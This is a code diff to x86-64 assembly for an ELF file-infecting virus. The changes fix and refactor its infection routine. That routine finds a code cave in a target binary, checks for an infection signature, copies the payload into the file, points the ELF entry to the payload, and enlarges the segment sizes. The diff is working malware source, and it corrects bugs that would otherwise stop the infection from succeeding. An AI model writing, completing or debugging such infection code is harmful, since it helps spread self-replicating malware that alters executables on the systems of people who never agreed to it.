@@ -5,6 +5,7 @@ section .text
 
 host:
 			mov rax, SYSCALL_EXIT
+			mov rdi, 0
 			syscall
 
 _start:
@@ -19,8 +20,7 @@ _start:
 
 		; Get host entry address and push it to stack
 			lea rax, [rel _start]
-			mov rdx, [rel payloadEntry]
-			sub rax, rdx
+			sub rax, [rel payloadEntry]
 			add rax, [rel hostEntry]
 			push rax
 
@@ -243,9 +243,11 @@ injectVirus:
 
 		.checkSpace:
 		; Check if code cave is large enough
-		; Get end of segment
+		; Get offset of end of segment and save it for later
 			mov rax, qword [rdi + elf64_phdr.p_offset]
 			add rax, qword [rdi + elf64_phdr.p_filesz]
+			mov r13, rax
+		; Use offset to get address of end of segment
 			lea rdi, [r15 + rax]
 			mov rsi, rdi
 		; Loop for PAYLOAD_SIZE as long as [rdi] is '\0'
@@ -256,14 +258,14 @@ injectVirus:
 			jnz .return
 
 	.checkAlreadyInfected:
-		; RSI => segment end
+		; RSI => address of segment end
 		; Look a few byte before segment end to look for an already existing signature
 			mov rax, [rel signature]
 			cmp rax, qword [rsi - (_end - signature)]
 			jz .return
 
 	.injectPayload:
-		; RSI => segment end
+		; RSI => address of segment end
 		; Copy PAYLOAD_SIZE bytes from _start to segment end
 			lea rdi, [rel _start]
 			xchg rdi, rsi
@@ -271,18 +273,17 @@ injectVirus:
 			repnz movsb
 
 	.saveEntries:
-		; RDI => segment end
+		; RDI => address of segment end
 		; Edit `payloadEntry` and `hostEntry` variables
 			mov rax, qword [r15 + elf64_ehdr.e_entry]
 			mov qword [rdi - 16], r13
 			mov qword [rdi - 8], rax
 
 	.updateFileHeader:
-		; R13 => payload start
 		; Edit file entry to payload start
 			mov qword [r15 + elf64_ehdr.e_entry], r13
-			mov rax, PAYLOAD_SIZE
 		; Increase infected segment size to include payload
+			mov rax, PAYLOAD_SIZE
 			add qword [r14 + elf64_phdr.p_filesz], rax
 			add qword [r14 + elf64_phdr.p_memsz], rax
 
